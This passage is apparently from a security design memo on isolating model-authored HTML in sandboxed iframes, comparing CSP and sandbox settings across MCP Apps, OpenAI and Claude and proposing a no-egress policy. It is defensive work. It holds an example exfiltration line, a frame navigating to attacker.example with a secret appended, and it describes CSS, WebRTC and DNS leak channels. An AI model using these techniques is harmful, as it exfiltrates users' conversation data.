> specific fetch directive, but are instead **governed by the union of servers allowed in all of a
> policy's directives' source lists**. If `default-src` is not specified, these requests will
> always be allowed.

and §8.6: "A policy's exfiltration mitigation ability depends upon the **least-restrictive
directive allowlist**", illustrated with `default-src 'none'; img-src *` as a policy that "appears
to protect from exfiltration" but does not. **One permissive host token anywhere reopens egress
for the whole document.** A scheme-only token (`data:`) does not, because it names no server.

**Fallback structure**, from [CSP3 §6.8.3](https://www.w3.org/TR/CSP3/#directive-fallback-list).
`default-src 'none'` is equivalent to setting `connect-src`, `font-src`, `frame-src`, `img-src`,
`manifest-src`, `media-src`, `object-src`, `script-src-elem`, `script-src-attr`, `style-src-elem`,
`style-src-attr`, `worker-src` — and **nothing else**. In particular it does **not** cover:

| Directive | Section | Falls back to `default-src`? |
|---|---|---|
| `form-action` | §6.4.1, *Navigation Directives* | **No** — "Not setting this allows anything" (MDN) |
| `base-uri` | §6.3.1, *Document Directives* | **No** |
| `frame-ancestors` | §6.4.2 | **No** — "will not fall back to the `default-src` directive"; also ignored in `<meta>` |
| `sandbox` | §6.3.2 | n/a — header-only, ignored in `<meta>` and in report-only |
| `webrtc` | §6.2.1 | n/a — `'allow'` / `'block'` only |

`<meta>`-delivered policies additionally cannot carry `report-uri`, `frame-ancestors`, or
`sandbox` (CSP3 §3.3), which is the specification-level reason behind the reference
implementations' "HTTP headers, tamper-proof unlike meta tags" comments.

**Coverage of the actual egress verbs:**

- `connect-src` covers `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource`,
  `navigator.sendBeacon()`, and `<a ping>`
  ([MDN `connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src)).
- Subresource loads: `img-src`, `font-src`, `style-src`, `script-src`, `media-src`, `object-src`,
  `manifest-src`, `worker-src`.
- Resource hints (`prefetch`, `preconnect`): the union rule above.
- Frame loads and frame navigations: `frame-src` (§4.5).
- Form submission: `form-action` **only**.
- WebRTC: `webrtc 'block'` **only** — see §7.
- `prefetch-src` and `navigate-to` **do not exist in CSP3** (zero occurrences in the spec text).
  MDN's browser-compat data lists `prefetch-src` as deprecated with support only in Safari 16.3,
  and has no entry for `navigate-to` at all
  ([BCD](https://github.com/mdn/browser-compat-data/blob/main/http/headers/Content-Security-Policy.json)).
  Do not write either into an ADR.

### 4.5 Navigation as an egress channel — and the directive that closes it

The sandboxed navigation flag is *always* set and no token relaxes it, but it explicitly permits
one thing: navigating "the sandboxed browsing context **itself**" (HTML §7.1.5). So a frame with
`allow-scripts` can always do `location = "https://attacker.example/?" + secret`, or
`<meta http-equiv="refresh">`, or a same-frame link click. Sandbox tokens do not stop this;
`allow-top-navigation*` and `allow-popups` only govern *other* browsing contexts.

The directive that does stop it is `frame-src`, and the mechanism is worth stating exactly,
because it is not obvious that a frame's *own* policy governs its *own* navigation. HTML's
"create navigation params by fetching"
([HTML §7.4](https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching))
builds the navigation request with `destination` `"document"`, then:

> If *navigable*'s container is non-null: … Set request's **destination** to navigable's
> container's **local name**.

— i.e. `"iframe"`, **regardless of who initiated the navigation** — and sets the request's policy
container to "sourceSnapshotParams's source policy container", the initiator's. CSP3's effective-
directive mapping ([§6.8.1](https://www.w3.org/TR/CSP3/#effective-directive-for-a-request)) sends
destination `"frame"`/`"iframe"` to **`frame-src`**. So a frame navigating itself is checked
against `frame-src` in **its own** CSP list — which, under either architecture in §4.3, is the
host-authored policy (inherited in B, from its own response headers in A).

**Practical rule for the ADR:** `default-src 'none'` already yields `frame-src 'none'` by
fallback, which closes self-navigation, `<meta refresh>`, and link clicks. `form-action 'none'`
must be written **explicitly** — it has no fallback and it is the pre-navigation check for form
submissions. Withholding `allow-forms`, `allow-top-navigation*`, `allow-popups` and
`allow-downloads` closes the rest at the platform layer. Belt and braces are warranted here
because the two layers fail differently.

**[flagged]** The `frame-src`-blocks-self-navigation conclusion is derived from the spec
algorithms above rather than from a normative sentence that states it, and no primary source
asserts it in those words. It is cheap to confirm empirically (a frame under `default-src 'none'`
attempting `location = "https://example.com"`), and it should be confirmed before the ADR relies
on it as the sole control — which is another reason to withhold the sandbox tokens as well.

### 4.6 Height messaging: the state of the platform

**There is still no shipped declarative primitive.** MDN's `<iframe>` reference documents a new
one — `<meta name="responsive-embedded-sizing">` in the guest opts it into sharing its layout size,
the CSS `frame-sizing` property on the `<iframe>` adopts it, and `Window.requestResize()` pushes
updates
([MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/responsive-embedded-sizing))
— but MDN's browser-compat data puts `frame-sizing` at **Chrome 149 behind
`#enable-experimental-web-platform-features`, unsupported in Firefox and Safari**
([BCD `css/properties/frame-sizing.json`](https://github.com/mdn/browser-compat-data/blob/main/css/properties/frame-sizing.json)).
MDN also states the reason it did not exist before: "For security and privacy reasons, `<iframe>`
elements do not by default expose any information to the parent document about the size of the
content in the document they are embedding."

So `postMessage` + `ResizeObserver` remains the only portable mechanism in 2026, and §1.6 is the
best-documented instance of it. The two independently-arrived-at variants are MCP Apps'
`{width, height}` push against a fixed/flexible/unbounded container contract, and OpenAI's
`notifyIntrinsicHeight(...)` push against a `maxHeight` global. They are the same protocol with
different spelling.

---

## 5. The convergent envelope, written to be lifted

### 5.1 Sandbox tokens

| System | Tokens | Source |
|---|---|---|
| MCP Apps, normative (proxy frame) | `allow-scripts allow-same-origin` | spec §Sandbox proxy |
| ext-apps reference host (both frames) | `allow-scripts allow-same-origin allow-forms` | `implementation.ts`, `sandbox.ts` |
| `@mcp-ui/client` (default) | `allow-scripts allow-same-origin allow-forms` | `SandboxConfig` docs, `app-host-utils.ts` |
| `@mcp-ui/client` (external URL inner frame) | `allow-same-origin allow-scripts` | `scripts/proxy/index.html` |
| e2b `fragments` (remote sandbox URL) | `allow-forms allow-scripts allow-same-origin` | prior survey, verified in source |
| Claude Artifacts | **not published** | — |
| OpenAI Apps SDK | **not published**; modals demonstrably absent | — |

**Convergent set: `allow-scripts allow-same-origin allow-forms`.**

**Recommended for a display-only lane: `allow-scripts` — and nothing else.** Justification, each
grounded above: `allow-same-origin` exists in the convergent set only to support storage, CORS,
OAuth callbacks and `document.write` injection (§1.4), none of which a display-only frame needs;
dropping it forces an opaque origin, which removes cookie/`localStorage` sharing **between
payloads on the same sandbox domain** (§4.1) and removes the View's ability to script the proxy
(§1.4). `allow-forms` exists because widgets have forms; dropping it blocks form submission at the
platform layer instead of relying on `form-action`, which has no `default-src` fallback (§4.4).
Everything else — popups, top-level navigation, downloads, modals, pointer lock, presentation,
orientation lock, storage access — is simply not needed and each is a distinct abuse channel.

Pair it with an explicitly empty `allow=""` (Permissions Policy) so camera, microphone,
geolocation and clipboard-write are denied by construction. MCP Apps has a whole `permissions`
negotiation block for exactly these four; a display-only lane grants none of them, so the
negotiation collapses to a constant.

### 5.2 CSP directives

| Directive | MCP Apps normative default | ext-apps reference host | Artifacts (described) | Proposed for a display-only no-egress frame |
|---|---|---|---|---|
| `default-src` | `'none'` | `'self' 'unsafe-inline'` | — | `'none'` |
| `script-src` | `'self' 'unsafe-inline'` | `'self' 'unsafe-inline' 'unsafe-eval' blob: data:` | inline only, no other host | `'unsafe-inline'` |
| `style-src` | `'self' 'unsafe-inline'` | `'self' 'unsafe-inline' blob: data:` | inline only, no other host | `'unsafe-inline'` |
| `img-src` | `'self' data:` | `'self' data: blob:` | data URIs only | `data:` |
| `font-src` | (absent → `'none'`) | `'self' data: blob:` | no other host | `data:` or `'none'` |
| `media-src` | `'self' data:` | `'self' data: blob:` | — | `'none'` |
| `connect-src` | `'none'` (but `'self'` in the same spec's security section) | `'self'` | fetch/XHR/WebSocket blocked | `'none'` |
| `frame-src` | `'none'` unless declared | `'none'` unless declared | — | `'none'` |
| `child-src` / `worker-src` | (absent) | `worker-src 'self' blob:` | — | `'none'` |
| `object-src` | `'none'` (proxy clause) | `'none'` | — | `'none'` |
| `base-uri` | `'self'` (proxy clause) | `'none'` | — | `'none'` |
| `form-action` | **absent** | **absent** | — | **`'none'`** |
| `frame-ancestors` | **absent** | **absent** | — | the host origin only (header-only) |
| `sandbox` | **absent** | **absent** | — | `allow-scripts` (header-only; architecture A) |
| `webrtc` | **absent** | **absent** | — | `'block'` — spec'd, unimplemented (§7) |

Note that `script-src 'unsafe-inline'` is not a concession here: the payload is one self-contained
document whose scripts are inline by construction, and with no host token anywhere, inline script
can be authored but cannot reach the network. `'unsafe-eval'` should **not** be granted; the
ext-apps SDK's own `jitless` workaround (§1.7) shows the cost falls on guest libraries, which in
MyMemo's case are model-authored and can simply be told the constraint.

### 5.3 Message set

The full display-only protocol, after subtracting §6:

| Direction | Message | Notes |
|---|---|---|
| Frame → Host | `ready` (or `ui/notifications/initialized`) | the only reliable readiness signal; host sends nothing before it |
| Frame → Host | `size-changed { width, height }` | clamp and rate-limit host-side (§7) |
| Host → Frame | `theme`/`host-context` (optional) | or bake the CSS variables into the served document, which removes the need for a channel at all |
| Host → Frame | `teardown` (optional) | fire-and-forget; nothing in a display-only frame has unsaved state |

That is two to four messages. Everything else in SEP-1865 is tool-loop machinery.

---

## 6. What exists only for the bidirectional tool-calling loop — and therefore does not apply

This is the axis on which MyMemo's case differs most from every system surveyed, so it is worth
being explicit rather than summarising.

**Data plumbing that presupposes a tool call.** `ui/notifications/tool-input`,
`tool-input-partial`, `tool-result`, `tool-cancelled`; `window.openai.toolInput`, `toolOutput`,
`toolResponseMetadata`. All of it exists because the UI is a *template* that must be joined to
*data* at render time. MyMemo's payload is a complete document — template and data are the same
artifact — so there is no second channel to feed and no partial-input streaming to handle.

**Frame → conversation channels.** `ui/message` (post as `role: "user"`),
`ui/update-model-context` (inject content the model reads next turn), `tools/call` and
`resources/read` proxying, `window.openai.sendFollowUpMessage`, `callTool`, `setWidgetState`
(model-visible `modelContent`). These *are* the thing display-only excludes. Their absence is not
a limitation to work around; it is the property that makes the lane defensible — it removes the
loop by which a prompt-injected page could influence the next turn.

**Author-identity machinery.** Predeclared `ui://` resources, prefetch/caching by URI,
`_meta.ui.resourceUri` linkage, `visibility: ["model"|"app"]`, hash-allowlisting, and the spec's
"Predeclared Resource Review" mitigation ("Review HTML content for obvious malicious patterns…
Generate hash/signature… Implement allowlists/blocklists based on resource hashes"). Every one of
these assumes a **stable, reviewable, pinnable author** — an MCP server operator. A per-turn,
model-authored payload has no such identity, is never seen twice, and cannot be reviewed before
first render. **The entire "review the template ahead of time" leg of the MCP Apps threat model
does not transfer.**

**Negotiated egress.** `_meta.ui.csp.connectDomains` / `resourceDomains` / `frameDomains` /
`baseUriDomains`, `HostCapabilities.sandbox.csp`, OpenAI's `redirect_domains`. This is the deepest
divergence: MCP Apps' CSP is **negotiated** with the payload author, because that author is
trusted enough to state its needs. MyMemo's author is the untrusted, prompt-injectable agent, so
there is no declaration channel at all — the policy is a **fixed constant**, and the entire
metadata schema, host-approval flow and "MUST NOT allow undeclared domains" enforcement machinery
collapses into a hard-coded header. Correspondingly, MyMemo does not inherit the
[CSP & CORS guide](https://github.com/modelcontextprotocol/ext-apps/blob/main/docs/csp-cors.md)'s
CORS/stable-origin problem, because the frame never makes a request.

**Presentation control.** `ui/request-display-mode`, `availableDisplayModes`, fullscreen/pip,
`requestModal`, `requestClose`, `setOpenInAppUrl`, `openExternal`/`ui/open-link` and their
allowlists, host-backed navigation history mirroring. All of it is a UI *application* asking for
window management. A display-only payload is content in a message, not an application.

**Capability negotiation itself.** `ui/initialize` carrying `appCapabilities`/`HostCapabilities`,
`tools.listChanged`, `ping`, the `experimental` blocks. With a fixed one-version contract and no
capabilities to negotiate, the handshake collapses to "the frame says it is ready".

**Permissions.** The camera/microphone/geolocation/clipboard-write block and its `allow`-attribute
mapping. Display-only grants none.

**State persistence.** `widgetState`/`setWidgetState`. A lane whose payloads replay verbatim from
Postgres forever has, by construction, no per-viewer state that should survive.

---

## 7. Known gaps and channels that survive the envelope

**Not solved by any surveyed protocol:**

1. **WebRTC.** `connect-src` does not cover it — that is why CSP3 §6.2.1 adds a `webrtc` directive
   with values `'allow'` / `'block'`. MDN's browser-compat data has **no entry for `webrtc` under
   `Content-Security-Policy`**, and Chromium tracks it as open work
   ([issue 40188662 "Evaluate and implement CSP directive 'webrtc'"](https://issues.chromium.org/issues/40188662),
   [issue 429838706 "Consider allowing CSP or sandbox to restrict WebRTC use"](https://issues.chromium.org/issues/429838706)).
   There is also no Permissions-Policy feature that disables `RTCPeerConnection` data channels
   (camera/microphone gate `getUserMedia`, not data channels). **Conclusion: script running in any
   frame can open a WebRTC data channel or leak via STUN, and no shipped web-platform control
   stops it.** No surveyed system mentions this. This is the strongest single argument for either
   accepting a residual leak or not granting `allow-scripts` at all. **[implementation status
   flagged: absence of BCD entries and open Chromium issues, not a vendor statement of
   non-support]**
2. **DNS-level hints.** CSP3 names "prefetch and preconnect" as governed by the union of source
   lists; it does **not** name `<link rel="dns-prefetch">`. Under an all-`'none'` policy the union
   is empty, so the intent clearly covers it, but the spec text does not say so and no primary
   source confirms browser behaviour. A hostname-only leak is low-bandwidth but real (encode into
   a subdomain). **[unverified]**
3. **Load failure, hang, and crash of the frame.** SEP-1865 defines no message or host obligation
   for any of these (§1.7). Every host invents its own timeout. A durable, replay-forever lane
   needs a defined fallback render — MyMemo already has the precedent in ADR-0017's framed
   fallback for unknown component/version.
4. **Unbounded size claims.** `ui/notifications/size-changed` carries an unvalidated number and
   the spec's only ceiling is the optional `containerDimensions.maxHeight`. Nothing normative
   requires the host to clamp, rate-limit, or sanity-check. A hostile frame can request an absurd
   height and disrupt the page, or oscillate to burn layout. Host-side clamping and debouncing are
   mandatory and are not in any spec.
5. **Resource consumption.** The spec names the risk and stops: "Malicious View can consume
   CPU/memory. Hosts should implement resource limits." No mechanism is specified anywhere. A
   model-authored `while(true)` is a plausible accident, not just an attack.
6. **Deceptive content.** Also named and left to the host: "Social engineering: UI can still
   display misleading content. Hosts should clearly indicate sandboxed UI boundaries." No
   technical control exists. For MyMemo this is amplified by the fact that the frame renders
   *inside the assistant's answer*, where users extend trust — the visual boundary is the only
   mitigation, and ADR-0017's renderer guidance argues against boxing payloads in chrome. That
   tension is real and belongs in the new ADR.
7. **The human as an exfiltration channel.** A rendered instruction, a link the user is told to
   type, a QR code encoding conversation content. No envelope addresses this. It is the residual
   after every technical channel is closed.

**Channels that are closable but only if the policy is exactly right:**

- **Form submission** — needs `form-action 'none'` *explicitly* (no fallback) and/or withholding
  `allow-forms`. Both shipped MCP Apps implementations fail this.
- **Self-navigation** (`location =`, `<meta refresh>`, link clicks) — closed by `frame-src 'none'`
  via the destination-`"iframe"` mechanism in §4.5.
- **Top-level navigation, popups, downloads** — closed by withholding the corresponding sandbox
  tokens.
- **CSS-based exfiltration** (attribute selectors driving `background-image: url(…)`, `@import`,
  webfont fetches) — closed only because `img-src`, `font-src` and `style-src` carry no host
  token. Add one host anywhere and this reopens, per the union rule.
- **Timing and cache side channels** — with an opaque origin, no storage and no network, the
  available oracles are thin, but they are not zero and are not addressed by any surveyed system.
  Low severity for a frame whose only secret is content the viewer is already looking at.

**MyMemo-specific consequences of replay-forever that no surveyed system faces:**

- The envelope is applied at **render** time, not persist time, so tightening it later applies
  retroactively to all history — good. But a payload authored under a loose envelope may stop
  rendering under a tight one. Version the envelope explicitly, the way ADR-0017 versions the
  payload contract, so old content degrades to a defined fallback rather than mis-rendering.
- Because payloads are immutable, a content-addressed sandbox origin
  (`sha256(payload).slice(…) + "." + sandboxDomain`) is available — the same construction Claude
  uses for `claudemcpcontent.com` subdomains. Per-payload origins partition storage and make
  `allow-same-origin` tolerable if it ever becomes necessary. That requires a wildcard certificate
  and a wildcard DNS record on the sandbox domain.
- Under architecture A (§4.3), each payload has a real URL, and MDN's warning applies: content
  that can be opened in a top-level tab is no longer sandboxed by the embedder. The served
  document must therefore carry its own `Content-Security-Policy: sandbox allow-scripts` and
  `frame-ancestors <host origin>` headers, plus `X-Content-Type-Options: nosniff`, and the URL
  must be ownership-checked or unguessable.
- The 16 KiB never-split `run_events` cap that shaped ADR-0017 still applies. A whole HTML page
  will not fit; MCP Apps' answer — the durable event carries a **reference**, the markup is
  fetched out of band and cached — is the directly applicable structural precedent. Which lane
  stores the markup is a separate decision and is not settled here.

---

## 8. Flagged unverified

Collected so the ADR author does not have to re-derive what is and is not knowable:

- Claude Artifacts' iframe `sandbox` token set, literal CSP string, single-vs-double frame
  architecture, sizing mechanism, and typical payload byte sizes. All absent from
  `code.claude.com/docs/en/artifacts` and from the claude.ai support article. Only the origin
  (`*.claudeusercontent.com`), the CSP's described effect, and the 16 MiB ceiling are published.
- OpenAI Apps SDK's sandbox token set and CSP directive text. Absent from the reference and the
  security guide; the absent-`allow-modals` inference is behavioural, not stated.
- OpenAI's `notifyIntrinsicHeight(...)` signature — the reference lists the method with an ellipsis
  and never gives its parameters.
- Whether CSP governs `<link rel="dns-prefetch">`. CSP3 names only prefetch and preconnect.
- Whether any shipping browser implements CSP `webrtc`. Inferred negative from MDN BCD's silence
  plus open Chromium issues; no vendor statement either way was found.
- The claim that `'self'` is unreliable in an opaque-origin frame is an implication of the origin
  model, supported by a CSP3 note about `base-uri` and opaque `srcdoc` documents, not by a direct
  normative statement.
- That `frame-src 'none'` blocks a frame from navigating *itself* (§4.5). Derived from the HTML
  navigation-request destination rule plus CSP3's effective-directive mapping; no primary source
  states it in those words. Confirm empirically before relying on it alone.

---

## 9. What to adopt

For the ADR author, in the order the decisions have to be made.

**Adopt verbatim.**

1. **The origin rule.** "The Host and the Sandbox MUST have different origins" — a separate
   *registrable* domain, not a subdomain of the app, so that cookie `Domain` scoping and
   same-site classification cannot bridge them. Both vendors do this
   (`claudeusercontent.com`, `claudemcpcontent.com`, `web-sandbox.oaiusercontent.com`) and it is
   the one control everything else depends on.
2. **CSP by HTTP response header, never `<meta>`.** Both reference implementations state the
   reason ("tamper-proof unlike meta tags") and CSP3 supplies the mechanical one: `sandbox`,
   `frame-ancestors` and `report-uri` are ignored in `<meta>`.
3. **`default-src 'none'` as the base**, plus explicit `object-src 'none'` and `base-uri 'none'`.
4. **The height protocol of §1.6, code and all** — `ResizeObserver` on both `documentElement` and
   `body`, `requestAnimationFrame` coalescing, `html.style.height = "max-content"` with restore,
   `window.innerWidth` for width, last-value comparison to break feedback loops — together with
   the fixed / flexible / unbounded container contract and the host's obligation to resize.
5. **Frame-initiated readiness.** The host sends nothing until the frame announces itself.
6. **The CSP domain sanitizer regex** (`/[;\r\n'" ]/`) for anything ever templated into a policy
   string, even if today that is nothing.
7. **The proxy's isolation self-test** (`window.top.alert()` must throw) as a boot assertion,
   wherever a second frame exists.

**Adopt with a deliberate change.**

8. **Sandbox tokens: `allow-scripts` only**, against the field's convergent
   `allow-scripts allow-same-origin allow-forms`. Display-only earns both subtractions, and each
   closes a real channel (§5.1). Pair with `allow=""`.
9. **`form-action 'none'` and `frame-ancestors <host origin>` written explicitly** — the two
   directives every surveyed policy omits, the first because it has no `default-src` fallback and
   the second because it locks down architecture A's directly-addressable URL.
10. **Prefer the single-frame, real-document architecture (§4.3 A).** The double iframe is a
    workaround for hosts that cannot serve HTTP; MyMemo can. It removes the proxy, the
    `sandbox-resource-ready` handshake, `document.write`, and the View-can-script-the-proxy
    weakness, and it is the only architecture in which the header-only `sandbox` and
    `frame-ancestors` directives are available. Keep architecture B in reserve if per-payload HTTP
    serving is rejected, and if so use `srcdoc` rather than `document.write` so the inner frame can
    stay opaque.

**Reject explicitly, and record why.**

11. Everything in §6 — the tool-loop data plumbing, the frame→conversation channels, the author-
    identity/predeclaration machinery, the negotiated-egress metadata schema, display modes, file
    APIs, permissions, and widget state. Each is present in the standard for a reason MyMemo does
    not have. Writing the rejection down matters: the temptation to "just implement SEP-1865"
    would import an interactive, negotiable, author-trusting protocol into a lane whose entire
    safety argument is that it is none of those things.
12. `'unsafe-eval'`, `blob:` and any host token in any directive — the union rule (§4.4) means a
    single one of these reopens egress document-wide.
13. `navigate-to` and `prefetch-src` — neither exists in CSP3.

**Decide, with the facts in hand.**

14. Whether to accept the residual **WebRTC** channel (§7.1). It is the only technical egress
    channel that survives a maximal envelope, and no surveyed system addresses it. The options are
    to accept it and say so, or to reconsider whether `allow-scripts` is worth its cost for the
    use cases actually driving this lane.
15. Host-side **clamping and rate-limiting of reported sizes**, and the **fallback render** for
    load failure, hang and unknown envelope version. All three are gaps in the standard and all
    three are load-bearing for a lane that replays forever.
16. How the markup reaches the client under the 16 KiB never-split event cap. MCP Apps' reference-
    plus-out-of-band-fetch is the applicable precedent; the choice of lane is out of scope here.
